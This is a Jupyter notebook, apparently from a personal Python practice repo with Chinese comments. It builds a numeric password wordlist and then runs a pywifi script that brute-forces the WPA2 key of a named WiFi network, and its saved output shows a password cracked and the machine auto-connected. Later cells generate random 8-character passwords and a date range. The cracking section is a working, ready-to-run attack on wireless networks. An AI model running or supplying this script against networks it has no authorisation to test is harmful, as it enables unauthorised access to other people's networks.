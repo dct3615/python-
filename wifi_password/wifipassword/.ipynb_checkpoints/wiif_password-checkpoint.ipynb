{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 生成密码本"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "开始生成密码\n",
      "密码本生成好了\n",
      "生成密码本一共用了多长时间：0:19:12.279684\n"
     ]
    }
   ],
   "source": [
    "import itertools as its\n",
    "import datetime\n",
    " \n",
    "#记录程序运行时间\n",
    "print('开始生成密码')\n",
    "start=datetime.datetime.now()\n",
    "words = '1234567890'#这里可以加入字母和其他字符，使用string包更方便\n",
    "# 生成密码的位数\n",
    "r = its.product(words,repeat = 9)#4即生成4位密码，正常情况下热点密码位数为8\n",
    "dic =open(r\"D:\\\\datasets\\\\passwords\\\\paswwer-9.txt\",'a')\n",
    "for i in r:\n",
    "    dic.write(''.join(i))\n",
    "    dic.write(''.join('\\n'))\n",
    "#     print(i) \n",
    "dic.close()\n",
    "print('密码本生成好了')\n",
    "end=datetime.datetime.now()\n",
    "print(\"生成密码本一共用了多长时间：{}\".format(end-start))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 密码破解"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "开始破解:\n",
      "密码破解中....密码校对:  12345678\n",
      "\n",
      "密码破解中....密码校对:  11111111\n",
      "\n",
      "密码破解中....密码校对:  22222222\n",
      "\n",
      "密码破解中....密码校对:  33333333\n",
      "\n",
      "密码破解中....密码校对:  66666666\n",
      "\n",
      "密码破解中....密码校对:  12345687\n",
      "\n",
      "密码已破解：  19910606\n",
      "\n",
      "WiFi已自动连接！！！\n",
      "破解WIFI密码一共用了多长时间：0:00:28.123403\n"
     ]
    }
   ],
   "source": [
    "# coding:utf-8\n",
    "import pywifi\n",
    "from pywifi import const\n",
    "import time\n",
    "import datetime\n",
    " \n",
    " \n",
    "#测试连接，返回链接结果\n",
    "def wifiConnect(pwd):\n",
    "    #抓取网卡接口\n",
    "    wifi=pywifi.PyWiFi()\n",
    "    #获取第一个无线网卡\n",
    "    ifaces=wifi.interfaces()[0]\n",
    "    #断开所有连接\n",
    "    ifaces.disconnect()\n",
    "    time.sleep(1)\n",
    "    wifistatus=ifaces.status()\n",
    "    if wifistatus ==const.IFACE_DISCONNECTED:\n",
    "        #创建WiFi连接文件\n",
    "        profile=pywifi.Profile()\n",
    "        #要连接WiFi的名称\n",
    "        profile.ssid=\"jiayi\"\n",
    "        #网卡的开放状态\n",
    "        profile.auth=const.AUTH_ALG_OPEN\n",
    "        #wifi加密算法,一般wifi加密算法为wps\n",
    "        profile.akm.append(const.AKM_TYPE_WPA2PSK)\n",
    "        #加密单元\n",
    "        profile.cipher=const.CIPHER_TYPE_CCMP\n",
    "        #调用密码\n",
    "        profile.key=pwd\n",
    "        #删除所有连接过的wifi文件\n",
    "        ifaces.remove_all_network_profiles()\n",
    "        #设定新的连接文件\n",
    "        tep_profile=ifaces.add_network_profile(profile)\n",
    "        ifaces.connect(tep_profile)\n",
    "        #wifi连接时间\n",
    "        time.sleep(3)\n",
    "        if ifaces.status()==const.IFACE_CONNECTED:\n",
    "            return True\n",
    "        else:\n",
    "            return False\n",
    "    else:\n",
    "        print(\"已有wifi连接\") \n",
    " \n",
    "#读取密码本\n",
    "def readPassword():\n",
    "    print(\"开始破解:\")\n",
    "    #密码本路径\n",
    "    path=\"D:\\\\datasets\\\\passwords\\\\paswwer.txt\"\n",
    "    #打开文件\n",
    "    file=open(path,\"r\")\n",
    "    while True:\n",
    "        try:\n",
    "            #一行一行读取\n",
    "            pad=file.readline()\n",
    "            bool=wifiConnect(pad)\n",
    "            \n",
    "            if bool:\n",
    "                print(\"密码已破解： \",pad)\n",
    "                print(\"WiFi已自动连接！！！\")\n",
    "                break\n",
    "            else:\n",
    "                #跳出当前循环，进行下一次循环\n",
    "                print(\"密码破解中....密码校对: \",pad)\n",
    "        except:\n",
    "            continue\n",
    " \n",
    "start=datetime.datetime.now() \n",
    "readPassword()\n",
    "end=datetime.datetime.now()\n",
    "print(\"破解WIFI密码一共用了多长时间：{}\".format(end-start))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## python 实现随机生成包8位包含大写字母、小写字母和数字的密码的程序。\n",
    "要求：\n",
    "* 1.用户输入多少次就生成多少条密码，\n",
    "* 2.要求密码必须同时包含大写字母、小写字母和数字，长度8位，不能重复"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "请输入一个数字：14000\n"
     ]
    }
   ],
   "source": [
    "# 用集合交集的方法生成密码：\n",
    "\n",
    "import random,string\n",
    "num = input('请输入一个数字：').strip()\n",
    "pwds = set()\n",
    "if num.isdigit():\n",
    "    while len(pwds)<int(num): # 保证生成条数足够\n",
    "        passwd = set(random.sample(string.ascii_letters+string.digits,8))\n",
    "        set1 = set(string.ascii_uppercase).intersection(passwd)\n",
    "        set2 = set(string.ascii_lowercase).intersection(passwd)\n",
    "        set3 = set(string.digits).intersection(passwd)\n",
    "        if set1 and set2 and set3:\n",
    "            str_passwd=''.join(passwd)+'\\n'#要把产生的密码变成字符串，因为前面已经给变成集合了\n",
    "            pwds.add(str_passwd)\n",
    "    fw =open('D:\\\\datasets\\\\passwords\\\\pwds.txt','w')\n",
    "    fw.writelines(pwds)\n",
    "else:\n",
    "    print('你输入的不是数字')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "请输入你要产生多少条密码：15000\n"
     ]
    }
   ],
   "source": [
    "import random,string\n",
    "\n",
    "count = input('请输入你要产生多少条密码：').strip()\n",
    "all_passwds = []\n",
    "for i in range(int(count)):\n",
    "    num = random.sample(string.digits,1) #随机取1位数字\n",
    "    lower = random.sample(string.ascii_lowercase,1) #随机取1位小写字母\n",
    "    upper = random.sample(string.ascii_uppercase,1) #随机取1位大写字母\n",
    "    other = random.sample(string.ascii_letters+string.digits,5) #随机取5位\n",
    "    res = num+lower+upper+other #产生的8位密码\n",
    "    res = ''.join(res)+'\\n'\n",
    "#     print('res...',res)\n",
    "    if res not in all_passwds: #判断是否重复\n",
    "        all_passwds.append(res)\n",
    "with open('D:\\\\datasets\\\\passwords\\\\pwds-2.txt','a+') as fw:\n",
    "    fw.seek(0)\n",
    "    fw.writelines(all_passwds)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "请输入你要产生多少条密码：15000\n"
     ]
    }
   ],
   "source": [
    "import random,string\n",
    "\n",
    "count = input('请输入你要产生多少条密码：').strip()\n",
    "all_passwds = set()\n",
    "for i in range(int(count)):\n",
    "    lower = random.sample(string.ascii_lowercase,3) #随机取3位小写字母\n",
    "    nums = random.sample(string.digits,5) #随机取5位\n",
    "    res = lower+nums #产生的8位密码\n",
    "    res = ''.join(res)+'\\n'\n",
    "    all_passwds.add(res)\n",
    "with open('D:\\\\datasets\\\\passwords\\\\pwds-3.txt','a+') as fw:\n",
    "    fw.seek(0)\n",
    "    fw.writelines(all_passwds)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# 生成8位密码，有重复"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\n",
      "60000\n"
     ]
    }
   ],
   "source": [
    "import random,string\n",
    "s=string.ascii_letters+string.digits\n",
    "print(s)\n",
    "n={''.join(random.choices(s,k=8)) for I in range(60000)}\n",
    "print(len(n))\n",
    "with open('D:\\\\datasets\\\\passwords\\\\pwds.csv','w') as f:\n",
    "    for i in n:\n",
    "        f.write(i+'\\n')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "DatetimeIndex(['1980-01-01', '1980-01-02', '1980-01-03', '1980-01-04',\n",
       "               '1980-01-05', '1980-01-06', '1980-01-07', '1980-01-08',\n",
       "               '1980-01-09', '1980-01-10',\n",
       "               ...\n",
       "               '2019-09-03', '2019-09-04', '2019-09-05', '2019-09-06',\n",
       "               '2019-09-07', '2019-09-08', '2019-09-09', '2019-09-10',\n",
       "               '2019-09-11', '2019-09-12'],\n",
       "              dtype='datetime64[ns]', length=14500, freq='D')"
      ]
     },
     "execution_count": 21,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "import pandas as pd\n",
    "\n",
    "df_index = pd.date_range('19800101', periods = 14500)\n",
    "df_index"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.4"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
